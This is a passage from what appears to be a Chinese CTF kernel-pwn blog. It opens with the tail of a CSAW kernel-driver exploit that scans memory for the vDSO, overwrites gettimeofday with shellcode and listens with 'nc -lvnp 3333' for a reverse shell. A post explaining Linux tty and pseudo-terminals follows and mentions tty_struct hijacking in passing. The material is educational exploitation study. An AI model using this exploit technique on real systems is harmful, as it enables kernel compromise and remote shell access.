channel_shrink.size = <span class="number">0x101</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;channel_shrink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>,offset);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> addr = <span class="number">0xffff880000000000</span>; addr&lt;<span class="number">0xffffc80000000000</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">        RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(read_buff+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%p found it?\n&quot;</span>, addr);</span><br><span class="line">            vdso_addr = addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vdso_addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;not find vdso&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in kernel: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> gettimeofday = vdso_addr + <span class="number">0xcb0</span>;</span><br><span class="line">    WAA(fd,channel_id,shellcode,gettimeofday,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;open a shell\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;nc -lvnp 3333&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>尝试了一下 “cred attack” 和 “vdso attack”</p>
<p>本来还想试试 “HijackPrctl”，但在 <code>qwb2018-solid_core</code> 中已经复现过了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">Linux tty 简析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-07 21:30:27 / Modified: 21:31:56" itemprop="dateCreated datePublished" datetime="2022-10-07T21:30:27+08:00">2022-10-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>tty_struct attack</strong></p>
<p>当用户打开 ptmx 驱动时 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> ，会分配一个 <code>tty_struct</code> 结构，它的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">	<span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">	<span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>	<span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>		<span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	<span class="keyword">int</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>		<span class="comment">/* winsize_mutex */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,	<span class="comment">/* flow_lock */</span></span><br><span class="line">		      flow_stopped:<span class="number">1</span>,</span><br><span class="line">		      unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> hw_stopped;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,	<span class="comment">/* ctrl_lock */</span></span><br><span class="line">		      packet:<span class="number">1</span>,</span><br><span class="line">		      unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;	<span class="comment">/* Bytes free for queue */</span></span><br><span class="line">	<span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *disc_data;</span><br><span class="line">	<span class="keyword">void</span> *driver_data;</span><br><span class="line">	<span class="keyword">spinlock_t</span> files_lock;		<span class="comment">/* protects tty_files list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> closing;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">	<span class="keyword">int</span> write_cnt;</span><br><span class="line">	<span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>其中有一个 <code>struct tty_operations</code> 指针，而 <code>tty_operations</code> 结构体里是一些列对驱动操作的函数指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">			<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">	<span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">		      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">	<span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">	<span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">		    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">	<span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">			     <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">	<span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">	<span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">	<span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">	<span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">	<span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">	<span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">	<span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">	<span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">	<span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">	<span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">				struct serial_icounter_struct *icount);</span><br><span class="line">	<span class="keyword">int</span>  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);</span><br><span class="line">	<span class="keyword">int</span>  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);</span><br><span class="line">	<span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">	<span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">	<span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">	<span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p><code>tty_struct</code> 结构体的大小为 <code>0x2E0</code>，在 kernel pwn 中，如果可以有 <code>kmalloc-1k</code> 我们就会考虑进行 <code>tty_struct attack</code>（劫持 <code>tty_operations</code>，控制执行流）</p>
<p>内核的利用并不是本篇文章的重点，接下来我们将关注 <code>tty</code> 本身在内核中的作用</p>
<p><strong>仿真终端</strong></p>
<p><code>tty</code> 其实是 “电传打字机(Teletypewriter)” 的缩写（后来这种设备逐渐键盘和显示器取代），泛指计算机的终端（terminal）设备 </p>
<ul>
<li>在 Linux 或 UNIX 中，<code>tty</code> 变为了一个抽象设备（用于表示各种类型的终端设备）：<ul>
<li>有时它指的是一个物理输入设备（例如串口）</li>
<li>有时它指的是一个允许用户和系统交互的“虚拟仿真终端设备”</li>
</ul>
</li>
</ul>
<p>现代物理 IO 设备都采用“键盘+显示器”：</p>
<ul>
<li>如果用户态程序要把内容输出到显示器，只要把这些内容写入到显示器对应的 <code>tty</code> 设备就可以了，然后由 <code>tty</code> 层负责匹配合适的驱动完成输出，这也是 Linux 控制台的工作原理：</li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665118227239.png" class width="1665118227239"> 
<ul>
<li>显示器和键盘这类物理设备会被抽象为驱动 driver</li>
<li>而终端仿真程序 Terminal Emulator（虚拟终端）使用驱动接口完成进一步的抽象</li>
<li>本质上来讲键盘输入的字符是没有意义的，而终端仿真程序会对这些字符进行“格式化”，“适配”和“解释”，这个过程被称为行规程 Line Discipline</li>
<li>经过行规程的数据将会通过 <code>tty</code> 和用户层进行交互，同时返回输出数据</li>
<li>返回的数据也要经过行规程，然后被“翻译”为显示器驱动可以理解的形式并输出</li>
</ul>
<p>在 Linux 中可以直接查看 <code>tty</code> 层的设备：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ls /dev/tty*</span><br><span class="line">/dev/tty    /dev/tty23  /dev/tty39  /dev/tty54      /dev/ttyS10  /dev/ttyS26</span><br><span class="line">/dev/tty0   /dev/tty24  /dev/tty4   /dev/tty55      /dev/ttyS11  /dev/ttyS27</span><br><span class="line">/dev/tty1   /dev/tty25  /dev/tty40  /dev/tty56      /dev/ttyS12  /dev/ttyS28</span><br><span class="line">/dev/tty10  /dev/tty26  /dev/tty41  /dev/tty57      /dev/ttyS13  /dev/ttyS29</span><br><span class="line">/dev/tty11  /dev/tty27  /dev/tty42  /dev/tty58      /dev/ttyS14  /dev/ttyS3</span><br><span class="line">/dev/tty12  /dev/tty28  /dev/tty43  /dev/tty59      /dev/ttyS15  /dev/ttyS30</span><br><span class="line">/dev/tty13  /dev/tty29  /dev/tty44  /dev/tty6       /dev/ttyS16  /dev/ttyS31</span><br><span class="line">/dev/tty14  /dev/tty3   /dev/tty45  /dev/tty60      /dev/ttyS17  /dev/ttyS4</span><br><span class="line">/dev/tty15  /dev/tty30  /dev/tty46  /dev/tty61      /dev/ttyS18  /dev/ttyS5</span><br><span class="line">/dev/tty16  /dev/tty31  /dev/tty47  /dev/tty62      /dev/ttyS19  /dev/ttyS6</span><br><span class="line">/dev/tty17  /dev/tty32  /dev/tty48  /dev/tty63      /dev/ttyS2   /dev/ttyS7</span><br><span class="line">/dev/tty18  /dev/tty33  /dev/tty49  /dev/tty7       /dev/ttyS20  /dev/ttyS8</span><br><span class="line">/dev/tty19  /dev/tty34  /dev/tty5   /dev/tty8       /dev/ttyS21  /dev/ttyS9</span><br><span class="line">/dev/tty2   /dev/tty35  /dev/tty50  /dev/tty9       /dev/ttyS22</span><br><span class="line">/dev/tty20  /dev/tty36  /dev/tty51  /dev/ttyprintk  /dev/ttyS23</span><br><span class="line">/dev/tty21  /dev/tty37  /dev/tty52  /dev/ttyS0      /dev/ttyS24</span><br><span class="line">/dev/tty22  /dev/tty38  /dev/tty53  /dev/ttyS1      /dev/ttyS25</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/dev/tty</code>：（控制终端）<ul>
<li>代表当前 <code>tty</code> 设备</li>
<li>在当前的终端中输入 <code>echo hello &gt; /dev/tty</code> ，都会直接显示在当前的终端中</li>
</ul>
</li>
<li><code>/dev/tty1 ~ /dev/tty6</code>：（虚拟终端）<ul>
<li>用于表示运行在内核态的软件仿真终端 </li>
<li>可以把这些 <code>tty</code> 设备理解为对虚拟终端的一种抽象，使得用户程序能以操控文件的形式来与虚拟终端交互</li>
</ul>
</li>
<li><code>/dev/tty0</code>：（虚拟终端）<ul>
<li>代表当前虚拟终端</li>
<li><code>/dev/tty</code> 主要是针对进程来说的，而 <code>/dev/tty0</code> 是针对整个系统来说的（所以 <code>/dev/tty0</code> 拥有更高的权限）</li>
</ul>
</li>
<li><code>/dev/tty7 ~ /dev/tty63</code>：（其他终端）<ul>
<li>用于表示运行在内核态的其他终端</li>
<li>这些 <code>tty</code> 是由其他的关键软件使用的（例如 Ubuntu 中 <code>/dev/tty7</code> 就是图形显示管理器）</li>
</ul>
</li>
<li><code>/dev/ttyS0 ~ /dev/ttyS31</code>：（串行端口终端）<ul>
<li>是使用计算机串行端口连接的终端设备</li>
</ul>
</li>
</ul>
<p>我们可以做一个实验来感受一下 <code>/dev/tty1 ~ /dev/tty6</code>：</p>
<ul>
<li>先在当前终端中输入 <code>Ctrl + Alt + F4</code> 切换到 <code>/dev/tty4</code></li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665123646699.png" class width="1665123646699"> 
<ul>
<li>上图显示的就是一个虚拟终端 Terminal Emulator，用户态的 Shell 运行在它上面</li>
<li>输入 <code>Ctrl + Alt + F2</code> 切换到桌面环境，输入 <code>sudo echo &quot;hello&quot; &gt; /dev/tty4</code>，然后返回 <code>/dev/tty4</code></li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665123684018.png" class width="1665123684018"> 
<ul>
<li>通过操作 <code>/dev/tty4</code> 文件，可以把用户态程序输入的内容输出到对应的虚拟终端上</li>
</ul>
<p>可以认为 <code>tty</code> 是虚拟终端的一个抽象层：</p>
<ul>
<li><code>tty</code> 给用户态程序 Shell 提供了一种抽象，使其能够以操作文件的形式来控制各种终端</li>
</ul>
<p>但是 <code>tty</code> 是运行在内核态中的，为了便于将终端仿真移入用户空间，同时仍保持 <code>tty</code> 子系统的完整，伪终端被发明了出来（被称为 <code>pseudo-TTY</code>，简称 <code>pty</code>）</p>
<ul>
<li>每当你在系统中启动一个终端仿真器或使用任何类型的 shell 时，它都会与 <code>pty</code> 进行交互</li>
<li>当创建一个伪终端时，会在 <code>/dev/pts</code> 目录下创建一个设备文件（用于关联 <code>pty</code>）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ls -l /dev/pts </span><br><span class="line">总用量 0</span><br><span class="line">crw--w---- 1 yhellow tty  136, 0 10月  7 20:24 0</span><br><span class="line">crw--w---- 1 yhellow tty  136, 1 10月  7 20:24 1</span><br><span class="line">crw--w---- 1 yhellow tty  136, 2 10月  7 20:41 2</span><br><span class="line">c--------- 1 root    root   5, 2 10月  7 19:14 ptmx</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ lsof /dev/ptmx</span><br><span class="line">COMMAND    PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">gnome-ter 4015 yhellow   19u   CHR    5,2      0t0   87 /dev/ptmx</span><br><span class="line">gnome-ter 4015 yhellow   20u   CHR    5,2      0t0   87 /dev/ptmx</span><br><span class="line">gnome-ter 4015 yhellow   21u   CHR    5,2      0t0   87 /dev/ptmx</span><br></pre></td></tr></table></figure>
<ul>
<li>你可以在终端仿真器中输入 <code>tty</code> 来找到相关联的 <code>pty</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ tty                                        </span><br><span class="line">/dev/pts/0</span><br></pre></td></tr></table></figure>
<p><strong>伪终端</strong></p>
<p>伪终端（被称为 <code>pseudo-tty</code>，简称 <code>pty</code>）是指伪终端 master 和伪终端 slave 这一对字符设备，其中的 slave 对应 <code>/dev/pts/</code> 目录下的一个文件，而 master 则在内存中标识为一个文件描述符(fd)：</p>
<ul>
<li>master 端 - <code>ptm</code>：是更接近用户显示器、键盘的一端（基于 VFS 的特殊文件）</li>
<li>slave 端 - <code>pts</code>：是在虚拟终端上运行的 CLI（Command Line Interface，命令行接口）程序</li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665128335077.png" class width="1665128335077"> 
<p>伪终端本质上是运行在用户态的终端模拟器创建的一对字符设备：</p>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665128404943.png" class width="1665128404943"> 
<ul>
<li><code>/dev/ptmx</code> 是一个字符设备文件，当进程打开 <code>/dev/ptmx</code> 文件时，进程会同时获得：<ul>
<li>一个指向 <code>pseudoterminal master(ptm)</code> 的文件描述符</li>
<li>一个在 <code>/dev/pts</code> 目录中创建的 <code>pseudoterminal slave(pts)</code> 设备 </li>
</ul>
</li>
<li>建了一个伪终端对，并让 shell 运行在 slave 端：<ul>
<li>当用户在终端模拟器中按下键盘按键时，它产生字节流并写入 master 中，shell 便可从 master 中读取输入（以读文件的形式）</li>
<li>然后 shell 和它的子程序将输出内容写入 slave 中，由 CLI 程序进行显示</li>
</ul>
</li>
</ul>
<p>可以认为 <code>pty</code> 是一种轻量级的虚拟终端：</p>
<ul>
<li>是一些软件（如 ssh、screen、xterm 等）模拟的 Terminal Emulator</li>
<li>在 Linux 中右键打开的终端就是 <code>pty</code></li>
</ul>
<p><strong>伪终端的运用</strong></p>
<p>Telnet 和 SSH 都运用了伪终端技术（主要是远程登录部分）：</p>
<ul>
<li>每次用户通过客户端连接服务端的时候，服务端创建一个伪终端 master、slave 字符设备对</li>
<li>在 slave 端运行 login 程序，将 master 端的输入输出通过网络传送至客户端</li>
<li>客户端则将从网络收到的信息直接关联到键盘/显示器上</li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665146881569.png" class width="1665146881569"> 
<ul>
<li>网络通信的方式还是依靠 NC 底层的 socket（TCP 协议发包）</li>
<li>将 socket 生成的 socketFD 重定位为 master 端的“标准输入”（把管道的 <code>stdin</code> 重定位为 socketFD，再把管道的 <code>stdout</code> 重定位为 master）</li>
<li>使 master 端和 socketFD 共用一个命名管道（命名管道相当于两个文件，一个用来读，一个用来写，它们底层使用同一个 <code>inode</code> 所以数据共享）</li>
<li>最后把 login 的 <code>stdin stdout stderr</code> 重定位到 slave 上</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/05/HijackPrctl+kernel_base%E7%88%86%E7%A0%B4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/05/HijackPrctl+kernel_base%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">HijackPrctl+kernel_base爆破</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-05 22:14:05 / Modified: 22:16:30" itemprop="dateCreated datePublished" datetime="2022-10-05T22:14:05+08:00">2022-10-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
